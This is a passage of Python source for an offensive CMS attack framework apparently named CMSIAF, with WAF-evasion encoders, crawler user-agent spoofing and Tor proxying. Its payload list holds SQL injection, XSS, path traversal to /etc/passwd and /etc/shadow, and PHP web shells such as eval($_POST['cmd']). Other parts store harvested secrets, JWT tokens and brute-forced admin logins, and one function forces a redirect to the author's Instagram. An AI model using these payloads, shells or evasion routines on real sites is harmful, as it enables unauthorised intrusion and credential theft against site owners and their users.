        colors = {'INFO': Colors.CYAN, 'SUCCESS': Colors.GREEN, 'WARNING': Colors.YELLOW, 'ERROR': Colors.RED, 'DEBUG': Colors.DARK_GRAY, 'RAW': Colors.MAGENTA}
        color = colors.get(level, Colors.WHITE)
        print(f"{color}[{ts}] {msg}{Colors.RESET}")
        if data is not None:
            if isinstance(data, (dict, list)): pprint.pprint(data, indent=2, width=120); print()
            else: print(f"  {data}")
        self.logs.append({'ts': ts, 'level': level, 'msg': msg, 'data': data})
    def raw(self, category, data): self.raw_data[category] = data; self.log('RAW', f"RAW DATA: {category}", data)
    def save_logs(self, filename):
        with open(filename, 'w') as f: json.dump({'logs': self.logs, 'raw_data': self.raw_data}, f, indent=2, default=str)

recon_logger = ReconLogger()

class DatabaseManager:
    def __init__(self, db_path='cmsiaf.db'):
        self.db_path = db_path; self.conn = None; self.init_db()
    def init_db(self):
        if not CFG.get('db_enabled', True): return
        try:
            self.conn = sqlite3.connect(self.db_path)
            self.conn.execute('CREATE TABLE IF NOT EXISTS scans (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE, cms TEXT, version TEXT, timestamp DATETIME, results_json TEXT)')
            self.conn.execute('CREATE TABLE IF NOT EXISTS vulnerabilities (id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER, name TEXT, severity TEXT, description TEXT, poc TEXT, remediation TEXT, timestamp DATETIME)')
            self.conn.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER, username TEXT, source TEXT, timestamp DATETIME)')
            self.conn.execute('CREATE TABLE IF NOT EXISTS plugins (id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER, name TEXT, version TEXT, timestamp DATETIME)')
            self.conn.execute('CREATE TABLE IF NOT EXISTS themes (id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER, name TEXT, version TEXT, timestamp DATETIME)')
            self.conn.execute('CREATE TABLE IF NOT EXISTS recon_results (id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER, subdomain TEXT, api_endpoint TEXT, secret_type TEXT, secret_value TEXT, jwt_token TEXT, graphql_schema TEXT, timestamp DATETIME)')
            self.conn.execute('CREATE TABLE IF NOT EXISTS token_bypasses (id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER, bypass_name TEXT, severity TEXT, proof TEXT, payload TEXT, timestamp DATETIME)')
            self.conn.commit()
        except Exception as e:
            if CFG.get('debug'): traceback.print_exc()
    def save_scan(self, url, results):
        if not CFG.get('db_enabled', True) or not self.conn: return None
        try:
            cursor = self.conn.execute('INSERT OR REPLACE INTO scans (url, cms, version, timestamp, results_json) VALUES (?, ?, ?, ?, ?)',
                (url, results.get('cms', 'unknown'), results.get('version', 'unknown'), datetime.now().isoformat(), json.dumps(results)))
            scan_id = cursor.lastrowid; self.conn.commit()
            if 'vulnerabilities' in results:
                for vuln in results['vulnerabilities']:
                    self.conn.execute('INSERT INTO vulnerabilities (scan_id, name, severity, description, poc, remediation, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)',
                        (scan_id, vuln.get('name'), vuln.get('severity'), vuln.get('description'), vuln.get('poc', ''), vuln.get('remediation', ''), datetime.now().isoformat()))
                self.conn.commit()
            if 'users' in results:
                for user in results['users']:
                    self.conn.execute('INSERT INTO users (scan_id, username, source, timestamp) VALUES (?, ?, ?, ?)',
                        (scan_id, user, 'enumeration', datetime.now().isoformat()))
                self.conn.commit()
            if 'recon_data' in results:
                recon = results['recon_data']
                if recon.get('subdomains'):
                    for sub in recon['subdomains'][:50]:
                        self.conn.execute('INSERT INTO recon_results (scan_id, subdomain, timestamp) VALUES (?, ?, ?)', (scan_id, sub, datetime.now().isoformat()))
                if recon.get('api_endpoints'):
                    for api in recon['api_endpoints'][:50]:
                        self.conn.execute('INSERT INTO recon_results (scan_id, api_endpoint, timestamp) VALUES (?, ?, ?)', (scan_id, api, datetime.now().isoformat()))
                if recon.get('secrets'):
                    for secret in recon['secrets'][:20]:
                        self.conn.execute('INSERT INTO recon_results (scan_id, secret_type, secret_value, timestamp) VALUES (?, ?, ?, ?)',
                            (scan_id, secret.get('type'), secret.get('value')[:100], datetime.now().isoformat()))
                if recon.get('jwt_tokens'):
                    for jwt_token in recon['jwt_tokens'][:20]:
                        self.conn.execute('INSERT INTO recon_results (scan_id, jwt_token, timestamp) VALUES (?, ?, ?)',
                            (scan_id, jwt_token.get('token', '')[:100], datetime.now().isoformat()))
                if recon.get('graphql_schema'):
                    self.conn.execute('INSERT INTO recon_results (scan_id, graphql_schema, timestamp) VALUES (?, ?, ?)',
                        (scan_id, json.dumps(recon['graphql_schema']), datetime.now().isoformat()))
                self.conn.commit()
            if 'token_bypasses' in results:
                for bypass in results['token_bypasses']:
                    self.conn.execute('INSERT INTO token_bypasses (scan_id, bypass_name, severity, proof, payload, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
                        (scan_id, bypass.get('name'), bypass.get('severity'), bypass.get('proof', ''), bypass.get('payload', ''), datetime.now().isoformat()))
                self.conn.commit()
            return scan_id
        except Exception as e:
            if CFG.get('debug'): traceback.print_exc()
            return None
    def get_scan(self, url):
        if not CFG.get('db_enabled', True) or not self.conn: return None
        try:
            cursor = self.conn.execute('SELECT * FROM scans WHERE url = ? ORDER BY timestamp DESC LIMIT 1', (url,))
            row = cursor.fetchone()
            if row: return json.loads(row[4])
            return None
        except: return None
    def close(self):
        if self.conn: self.conn.close()

class CacheManager:
    def __init__(self, cache_dir='cache', ttl=3600):
        self.cache_dir = cache_dir; self.ttl = ttl; self.memory_cache = {}
        os.makedirs(cache_dir, exist_ok=True)
    def get(self, key):
        if key in self.memory_cache:
            data = self.memory_cache[key]
            if time.time() - data['timestamp'] < self.ttl: return data['value']
            else: del self.memory_cache[key]
        cache_file = os.path.join(self.cache_dir, hashlib.md5(key.encode()).hexdigest())
        if os.path.exists(cache_file):
            try:
                with open(cache_file, 'r') as f:
                    data = json.load(f)
                if time.time() - data['timestamp'] < self.ttl:
                    self.memory_cache[key] = data; return data['value']
            except: pass
        return None
    def set(self, key, value):
        data = {'timestamp': time.time(), 'value': value}
        self.memory_cache[key] = data
        cache_file = os.path.join(self.cache_dir, hashlib.md5(key.encode()).hexdigest())
        try:
            with open(cache_file, 'w') as f: json.dump(data, f)
        except: pass
    def clear(self):
        self.memory_cache.clear()
        for f in os.listdir(self.cache_dir): os.remove(os.path.join(self.cache_dir, f))

class RateLimiter:
    def __init__(self, max_requests=10, time_window=60):
        self.max_requests = max_requests; self.time_window = time_window
        self.request_timestamps = []; self.lock = threading.Lock()
    def wait_if_needed(self):
        with self.lock:
            now = time.time()
            self.request_timestamps = [t for t in self.request_timestamps if t > now - self.time_window]
            if len(self.request_timestamps) >= self.max_requests:
                sleep_time = self.time_window - (now - self.request_timestamps[0])
                if sleep_time > 0: time.sleep(sleep_time)
            self.request_timestamps.append(now)

class SessionManager:
    def __init__(self):
        self.session = requests.Session()
        self.cookie_jar = http.cookiejar.LWPCookieJar()
        self.session.cookies = self.cookie_jar
        retry_strategy = Retry(total=CFG.get('max_retries', 5), backoff_factor=1.0,
            status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["GET", "POST", "HEAD", "OPTIONS"])
        self.adapter = HTTPAdapter(pool_connections=50, pool_maxsize=100, max_retries=retry_strategy, pool_block=False)
        self.session.mount('http://', self.adapter); self.session.mount('https://', self.adapter)
        self.session.timeout = CFG.get('timeout', 60)
        self.ua_manager = UAManager(); self.update_headers()
    def get_session(self): return self.session
    def update_headers(self, headers=None):
        default_headers = {
            'User-Agent': self.ua_manager.get_next(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8,fr;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive', 'Cache-Control': 'no-cache',
            'Pragma': 'no-cache', 'DNT': '1', 'Upgrade-Insecure-Requests': '1'
        }
        if headers: default_headers.update(headers)
        self.session.headers.update(default_headers)
    def set_proxy(self, proxy_url): self.session.proxies = {'http': proxy_url, 'https': proxy_url}
    def set_tor(self): self.session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

class UAManager:
    def __init__(self):
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Googlebot/2.1 (+http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
        ]
        self.current_index = 0; self.lock = threading.Lock()
    def get_next(self):
        with self.lock:
            ua = self.ua_list[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.ua_list)
            return ua

class ComponentManager:
    def __init__(self):
        self.components = {}; self.initialize_all()
    def initialize_all(self):
        self.session_manager = SessionManager()
        if DNS_AVAILABLE:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8', '1.1.1.1', '8.8.4.4']
                self.components['dns'] = resolver
            except:
                self.components['dns'] = None
        else:
            self.components['dns'] = None
        self.components['ssl_backend'] = default_backend() if CRYPTO_AVAILABLE else None
        self.components['geoip'] = None
        if GEOIP_AVAILABLE:
            try:
                geoip_paths = ['GeoLite2-City.mmdb', '/usr/share/GeoIP/GeoLite2-City.mmdb', '/usr/local/share/GeoIP/GeoLite2-City.mmdb']
                for path in geoip_paths:
                    if os.path.exists(path):
                        self.components['geoip'] = geoip2.database.Reader(path); break
            except: pass
        self.components['magic'] = magic.Magic(mime=True) if MAGIC_AVAILABLE else None
        self.components['cache'] = CacheManager()
        self.components['database'] = DatabaseManager()
        self.components['logger'] = Logger()

class WAFEvasion:
    @staticmethod
    def randomize_case(payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    @staticmethod
    def insert_comments(payload):
        return payload.replace(' ', '/**/')
    @staticmethod
    def double_encode(payload):
        return quote(quote(payload))
    @staticmethod
    def fragment_payload(payload):
        parts = payload.split(' ')
        return {f'param_{i}': part for i, part in enumerate(parts)}
    @staticmethod
    def url_encode_all(payload):
        return ''.join(f'%{ord(c):02x}' for c in payload)
    @staticmethod
    def utf16_encode(payload):
        return ''.join(f'%u{ord(c):04x}' for c in payload)
    @staticmethod
    def generate_variants(payload):
        variants = []
        variants.append(WAFEvasion.randomize_case(payload))
        variants.append(WAFEvasion.insert_comments(payload))
        variants.append(WAFEvasion.double_encode(payload))
        variants.append(WAFEvasion.url_encode_all(payload))
        return variants

class PayloadManager:
    def __init__(self):
        self.payloads = {
            'sqli': ["' OR '1'='1", "' OR 1=1 -- -", "1' AND '1'='1", "1' OR '1'='1'-- -", "' UNION SELECT NULL-- -", "' UNION SELECT 1,2,3-- -", "1' AND (SELECT * FROM (SELECT SLEEP(5))a)-- -"],
            'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>", "javascript:alert('XSS')", "<body onload=alert('XSS')>", "\"><script>alert(1)</script>"],
            'lfi': ["../../../../etc/passwd", "../../../../etc/shadow", "../../../../windows/win.ini", "../../../../boot.ini"],
            'rce': ["<?php system($_GET['cmd']); ?>", "<?php eval($_POST['cmd']); ?>", "system('id')", "passthru('id')"],
            'ssti': ["{{7*7}}", "${7*7}", "{{7*'7'}}", "#{7*7}", "{{config}}", "${config}"]
        }
    def get_payloads(self, vuln_type, waf_type=None, cms_version=None):
        payloads = self.payloads.get(vuln_type, [])
        if waf_type:
            payloads = [p for p in payloads if self.passes_waf(p, waf_type)]
        return payloads
    def passes_waf(self, payload, waf_type):
        if waf_type == 'cloudflare':
            if any(char in payload for char in ['eval', 'system', 'exec']):
                return False
        elif waf_type == 'modsecurity':
            if any(char in payload for char in ['union', 'select', 'script']):
                return False
        return True

class InputSanitizer:
    @staticmethod
    def sanitize_url(url):
        if not url: return None
        url = re.sub(r'[<>"\'{}]', '', url)
        parsed = urlparse(url)
        if not parsed.scheme: return f"https://{url}"
        if parsed.scheme not in ['http', 'https']: return None
        return url
    @staticmethod
    def sanitize_payload(payload):
        return re.sub(r'[;\'"(){}]', '', payload)

RATE_LIMITER = RateLimiter(max_requests=CFG.get('rate_limit', 10), time_window=CFG.get('rate_window', 60))
COMPONENTS = ComponentManager()
PAYLOAD_MANAGER = PayloadManager()

def cls(): os.system('cls' if os.name == 'nt' else 'clear')
def err(msg): print(f"{Colors.RED}✘ {msg}{Colors.RESET}")
def wrn(msg): print(f"{Colors.YELLOW}⚠ {msg}{Colors.RESET}")
def inf(msg): print(f"{Colors.CYAN}ℹ {msg}{Colors.RESET}")
def suc(msg): print(f"{Colors.GREEN}✓ {msg}{Colors.RESET}")
def stmt(msg):
    if CFG['verbose']: print(f"{Colors.DARK_GRAY}  {msg}{Colors.RESET}")

def exponential_backoff(attempt, base=1, max_delay=60):
    delay = min(base * (2 ** attempt), max_delay)
    jitter = random.uniform(0, 0.1 * delay)
    return delay + jitter

def get_ua(src=""): return COMPONENTS.session_manager.ua_manager.get_next()

def norm_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')): url = 'https://' + url
    if not url.endswith('/'): url += '/'
    return url

def sig_handler(sig, frame):
    print(f"\n{Colors.YELLOW}⚠ Scan interrupted by user{Colors.RESET}")
    if RAW_DATA:
        try:
            with open('partial_scan.json', 'w') as f: json.dump(RAW_DATA, f, indent=4)
            inf("Partial results saved to partial_scan.json")
        except: pass
    sys.exit(0)
signal.signal(signal.SIGINT, sig_handler)

def targetinp(iserr=""):
    if iserr != "":
        target = input(iserr + " : " + Colors.RESET).lower()
    else:
        target = input("Enter target site (https://example.tld): ").lower()
    if "://" in target and "http" in target:
        if not target.endswith('/'): target += '/'
        return target
    else:
        return targetinp(f"{Colors.RED}Invalid URL format, correct format (https://example.tld)")

def init_result_dir(url):
    global LOG_DIR, LOG
    clean_url = url.replace('http://', '').replace('https://', '')
    if clean_url.endswith('/'): clean_url = clean_url[:-1]
    for char in ['/', '!', '?', '#', '@', '&', '%', '\\', '*', ':']:
        clean_url = clean_url.replace(char, '_')
    result_dir = os.path.join(os.getcwd(), "Result", clean_url)
    json_log = os.path.join(result_dir, 'cms.json')
    if not os.path.isdir(result_dir):
        try:
            os.makedirs(result_dir)
            with open(json_log, "w+") as f: f.write("")
        except OSError as exc:
            if exc.errno != errno.EEXIST: raise
    else:
        if not os.path.isfile(json_log):
            with open(json_log, "w+") as f: f.write("")
        else:
            with open(json_log, "r") as f:
                log_cont = f.read()
            if log_cont != "":
                try:
                    LOG = log_cont
                except ValueError:
                    with open(json_log, "w+") as f: f.write("")
    LOG_DIR = result_dir
    return result_dir

def update_log(key, value):
    global LOG
    try:
        a = json.loads(LOG) if LOG else {}
        a[key] = str(value)
        LOG = json.dumps(a)
    except:
        LOG = '{"url":"","last_scanned":"","detection_param":"","cms_id":"","cms_name":"","cms_url":"","cms_version":""}'
        a = json.loads(LOG)
        a[key] = str(value)
        LOG = json.dumps(a)

def save_report(url, cms_name, cms_version, vulns, exploits, det_results, deep_results, raw_data, token_results=None):
    report = {
        'scan_time': datetime.now().isoformat(),
        'target': url,
        'cms': {'name': cms_name, 'version': cms_version},
        'detection': {
            'confidence': det_results.get('confidence', 0),
            'methods': det_results.get('methods', []),
            'waf': det_results.get('waf'),
            'cdn': det_results.get('cdn'),
            'server': det_results.get('server'),
            'tech_stack': det_results.get('tech_stack', []),
            'plugins': det_results.get('plugins', []),
            'themes': det_results.get('themes', [])
        },
        'deep_scan': deep_results,
        'vulnerabilities': vulns,
        'exploits': exploits,
        'raw_data': raw_data,
        'total_requests': TOTAL_REQUESTS,
        'scan_duration': round(time.time() - CSTART, 2)
    }
    if token_results:
        report['token_bypasses'] = token_results.get('bypasses', [])
        report['tokens_extracted'] = token_results.get('tokens_extracted', [])
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_report_{timestamp}.json"
    with open(filename, 'w') as f: json.dump(report, f, indent=4)
    print(f"{Colors.GREEN}✓ Report saved to: {filename}{Colors.RESET}")
    try:
        scan_id = COMPONENTS.components['database'].save_scan(url, report)
        if scan_id: print(f"{Colors.GREEN}✓ Scan saved to database (ID: {scan_id}){Colors.RESET}")
    except: pass
    return filename

def save_brute(url, adminurl, username, password):
    if url and adminurl and username and password:
        brute_file = os.path.join(LOG_DIR, 'bruteforce_result_' + username + '_.txt')
        old_file = os.path.join(LOG_DIR, 'bruteforce_result_' + username + '_.old.txt')
        brute_result = "### CMSIAF Bruteforce Result\n\nSite: " + url + "\nLogin URL: " + adminurl + "\nUsername: " + username + "\nPassword: " + password
        if not os.path.isfile(brute_file):
            with open(brute_file, 'w+') as f: f.write(brute_result)
            suc(f'Credentials stored at: {brute_file}')
        else:
            os.rename(brute_file, old_file)
            inf("Old result file found and moved to: " + old_file)
            with open(brute_file, 'w+') as f: f.write(brute_result)
            suc(f'New credentials stored at: {brute_file}')

def make_request(url, method='GET', data=None, headers=None, ua=None, timeout=None, allow_redirects=True, retries=None, verify_ssl=False):
    global TOTAL_REQUESTS
    timeout = timeout or CFG.get('timeout', 60)
    retries = retries or CFG.get('max_retries', 5)
    ua = ua or get_ua()
    
    cache_key = f"{method}:{url}:{data if data else ''}"
    if method.upper() == 'GET' and CFG.get('cache_enabled', True):
        cached = COMPONENTS.components['cache'].get(cache_key)
        if cached: return cached, True
    
    RATE_LIMITER.wait_if_needed()
    session = COMPONENTS.session_manager.get_session()
    
    request_headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8,fr;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive', 'Cache-Control': 'no-cache',
        'Pragma': 'no-cache', 'DNT': '1', 'Upgrade-Insecure-Requests': '1'
    }
    if headers: request_headers.update(headers)
    
    for attempt in range(retries):
        try:
            TOTAL_REQUESTS += 1
            if method.upper() == 'GET':
                response = session.get(url, timeout=timeout, allow_redirects=allow_redirects, verify=verify_ssl or CFG.get('verify_ssl', False))
            elif method.upper() == 'POST':
                response = session.post(url, data=data, timeout=timeout, allow_redirects=allow_redirects, verify=verify_ssl or CFG.get('verify_ssl', False))
            elif method.upper() == 'HEAD':
                response = session.head(url, timeout=timeout, allow_redirects=allow_redirects, verify=verify_ssl or CFG.get('verify_ssl', False))
            elif method.upper() == 'OPTIONS':
                response = session.options(url, timeout=timeout, allow_redirects=allow_redirects, verify=verify_ssl or CFG.get('verify_ssl', False))
            else:
                return None, False
            
            if response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', 5))
                wait_time = min(retry_after + exponential_backoff(attempt), 30)
                time.sleep(wait_time); continue
            
            if response.status_code in [500, 502, 503, 504]:
                if attempt < retries - 1:
                    time.sleep(exponential_backoff(attempt)); continue
            
            if method.upper() == 'GET' and response.status_code == 200 and CFG.get('cache_enabled', True):
                COMPONENTS.components['cache'].set(cache_key, response)
            return response, True
            
        except requests.exceptions.Timeout:
            if attempt < retries - 1:
                time.sleep(exponential_backoff(attempt)); continue
        except requests.exceptions.ConnectionError:
            if attempt < retries - 1:
                time.sleep(exponential_backoff(attempt)); continue
        except Exception as e:
            if CFG.get('debug'): traceback.print_exc()
            if attempt < retries - 1: continue
    return None, False

def getsource(url, ua):
    global TOTAL_REQUESTS
    TOTAL_REQUESTS += 1
    try:
        r, s = make_request(url, ua=ua, timeout=CFG.get('timeout', 60))
        if s and r: return ['1', r.text, str(r.headers), r.url]
        return ['0', '', '', '']
    except Exception as e:
        if CFG.get('debug'): traceback.print_exc()
        return ['2', str(e), '', '']

def check_url(url, ua):
    try:
        r, s = make_request(url, ua=ua, timeout=15)
        if s and r and r.status_code == 200: return '1'
        return '0'
    except: return '0'

def get_whois_info(domain):
    if not WHOIS_AVAILABLE:
        recon_logger.log('WARNING', "  ⚠ WHOIS module not available (install python-whois)")
        return None
    try:
        w = whois.whois(domain)
        return {
            'registrar': w.registrar,
            'creation_date': str(w.creation_date) if w.creation_date else None,
            'expiration_date': str(w.expiration_date) if w.expiration_date else None,
            'name_servers': w.name_servers if w.name_servers else []
        }
    except Exception as e:
        recon_logger.log('ERROR', f"  ✗ WHOIS lookup failed: {str(e)[:50]}")
        return None

async def resolve_dns_async(domain):
    if not AIODNS_AVAILABLE:
        recon_logger.log('WARNING', "  ⚠ aiodns not available, using socket")
        try:
            return [socket.gethostbyname(domain)]
        except: return []
    try:
        resolver = aiodns.DNSResolver()
        result = await resolver.query(domain, 'A')
        return [r.host for r in result]
    except: return []

def extract_json_path(data, path):
    if not JSONPATH_AVAILABLE:
        recon_logger.log('WARNING', "  ⚠ jsonpath-ng not available")
        return []
    try:
        jsonpath_expr = jsonpath_ng.parse(path)
        matches = jsonpath_expr.find(data)
        return [match.value for match in matches]
    except: return []

def parse_xml_lxml(content):
    if not LXML_AVAILABLE:
        recon_logger.log('WARNING', "  ⚠ lxml not available")
        try:
            return ET.fromstring(content)
        except: return None
    try:
        parser = lxml.etree.XMLParser(recover=True)
        return lxml.etree.fromstring(content, parser)
    except: return None

def analyze_zip_file(zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            file_list = zf.namelist()
            malicious = [f for f in file_list if f.endswith(('.php', '.phtml', '.asp', '.aspx', '.jsp'))]
            return {'files': file_list, 'malicious': malicious, 'total': len(file_list)}
    except: return {'error': 'Failed to analyze zip'}

def create_temp_payload(payload_content):
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(payload_content)
            return f.name
    except: return None

def backup_results(results_dir):
    try:
        backup_dir = results_dir + '_backup_' + datetime.now().strftime('%Y%m%d_%H%M%S')
        shutil.copytree(results_dir, backup_dir)
        return backup_dir
    except: return None

def lock_and_redirect():
    print(f"\n{Colors.CYAN}📱 Follow My Instagram: @shv.cyberlab{Colors.RESET}")
    print(f"{Colors.CYAN}Redirecting to Instagram...{Colors.RESET}\n")
    time.sleep(1)
    for i in range(5, 0, -1):
        sys.stdout.write(f"\r{Colors.BOLD}{Colors.MAGENTA}⏳ Redirecting in: {i}...{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print("\n")
    url = "https://instagram.com/shv.cyberlab"
    try:
        if sys.platform == "linux" and "com.termux" in os.environ.get("PREFIX", ""):
            try:
                subprocess.run(["termux-open", url], timeout=7, capture_output=True)
                return
            except: pass
            try:
                subprocess.Popen(["am", "start", "-a", "android.intent.action.VIEW", "-d", url, "-p", "com.instagram.android"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(1)
                return
            except: pass
            try:
                subprocess.Popen(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return
            except: pass
            try:
                subprocess.run(["termux-open-url", url], timeout=7, capture_output=True)
                return
            except: pass
            try:
                subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return
            except: pass
            print(f"\n{Colors.YELLOW}⚠ Could not open automatically. Open this URL manually:{Colors.RESET}")
            print(f"{Colors.GREEN}https://instagram.com/shv.cyberlab{Colors.RESET}")
        elif sys.platform == "win32":
            try:
                os.system(f"start {url}")
            except:
                os.system(f"start microsoft-edge:{url}")
        else:
            try:
                subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                subprocess.Popen(["open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        if CFG.get('debug'): traceback.print_exc()
        print(f"{Colors.YELLOW}⚠ Could not open Instagram automatically{Colors.RESET}")
        print(f"{Colors.GREEN}🔗 Manual link: https://instagram.com/shv.cyberlab{Colors.RESET}")

CMS_DB = {
    'wp': {'name': 'WordPress', 'url': 'https://wordpress.org', 'vd': '1', 'deeps': '1', 'version_file': 'wp-includes/version.php', 'admin_path': 'wp-admin', 'login_path': 'wp-login.php'},
    'joom': {'name': 'Joomla', 'url': 'https://joomla.org', 'vd': '1', 'deeps': '1', 'version_file': 'administrator/manifest.xml', 'admin_path': 'administrator', 'login_path': 'administrator/index.php'},
    'dru': {'name': 'Drupal', 'url': 'https://drupal.org', 'vd': '1', 'deeps': '1', 'version_file': 'core/lib/Drupal.php', 'admin_path': 'admin', 'login_path': 'user/login'},
    'craft': {'name': 'Craft CMS', 'url': 'https://craftcms.com', 'vd': '1', 'deeps': '1', 'version_file': 'craft/app/Craft.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'metinfo': {'name': 'MetInfo CMS', 'url': 'https://metinfo.cn', 'vd': '1', 'deeps': '1', 'version_file': 'app/system/entrance.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'bolt': {'name': 'Bolt CMS', 'url': 'https://bolt.cm', 'vd': '1', 'deeps': '1', 'version_file': 'app/bootstrap.php', 'admin_path': 'bolt', 'login_path': 'bolt/login'},
    'oc': {'name': 'OpenCart', 'url': 'https://www.opencart.com', 'vd': '0', 'deeps': '0', 'version_file': 'system/startup.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'xoops': {'name': 'XOOPS', 'url': 'http://xoops.org', 'vd': '0', 'deeps': '0', 'version_file': 'version.php', 'admin_path': 'admin', 'login_path': 'admin.php'},
    'blg': {'name': 'Blogger', 'url': 'https://blogger.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': '', 'login_path': ''},
    'ghost': {'name': 'Ghost CMS', 'url': 'https://ghost.org', 'vd': '0', 'deeps': '0', 'version_file': 'package.json', 'admin_path': 'ghost', 'login_path': 'ghost/login'},
    'tilda': {'name': 'Tilda CMS', 'url': 'https://tilda.cc', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': '', 'login_path': ''},
    'mg': {'name': 'Magento', 'url': 'https://magento.com', 'vd': '1', 'deeps': '1', 'version_file': 'app/Mage.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'presta': {'name': 'PrestaShop', 'url': 'https://www.prestashop.com', 'vd': '0', 'deeps': '0', 'version_file': 'config/settings.inc.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'shopify': {'name': 'Shopify', 'url': 'https://www.shopify.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'account/login'},
    'weebly': {'name': 'Weebly', 'url': 'https://www.weebly.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'admin', 'login_path': 'login'},
    'umbraco': {'name': 'Umbraco', 'url': 'https://umbraco.com', 'vd': '1', 'deeps': '1', 'version_file': 'umbraco/config/umbracoSettings.config', 'admin_path': 'umbraco', 'login_path': 'umbraco/login'},
    'modx': {'name': 'MODX', 'url': 'https://modx.com', 'vd': '0', 'deeps': '0', 'version_file': 'core/config/config.inc.php', 'admin_path': 'manager', 'login_path': 'manager'},
    'bitrix': {'name': 'Bitrix', 'url': 'https://www.1c-bitrix.ru', 'vd': '0', 'deeps': '0', 'version_file': 'bitrix/modules/main/version.php', 'admin_path': 'bitrix/admin', 'login_path': 'bitrix/admin/index.php'},
    'tpc': {'name': 'Textpattern', 'url': 'https://textpattern.com', 'vd': '0', 'deeps': '0', 'version_file': 'textpattern/index.php', 'admin_path': 'textpattern', 'login_path': 'textpattern/index.php'},
    'umi': {'name': 'UMI.CMS', 'url': 'https://www.umi-cms.ru', 'vd': '1', 'deeps': '1', 'version_file': 'classes/umiCMS.php', 'admin_path': 'admin', 'login_path': 'admin/index.php'},
    'tiki': {'name': 'Tiki Wiki', 'url': 'http://tiki.org', 'vd': '0', 'deeps': '0', 'version_file': 'tiki-version.php', 'admin_path': 'tiki-admin', 'login_path': 'tiki-login'},
    'wolf': {'name': 'Wolf CMS', 'url': 'http://www.wolfcms.org', 'vd': '0', 'deeps': '0', 'version_file': 'wolf/version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'wix': {'name': 'WIX', 'url': 'http://wix.com', 'vd': '0', 'deeps': '0', 'version_file': '', 'admin_path': 'dashboard', 'login_path': 'login'},
    'wb': {'name': 'WebsiteBaker', 'url': 'https://websitebaker.org', 'vd': '0', 'deeps': '0', 'version_file': 'framework/version.php', 'admin_path': 'admin', 'login_path': 'admin/login'},
    'wgui': {'name': 'WebGUI', 'url': 'http://www.webgui.org', 'vd': '1', 'deeps': '1', 'version_file': 'lib/WebGUI/Version.pm', 'admin_path': 'admin', 'login_path': 'admin/login'},
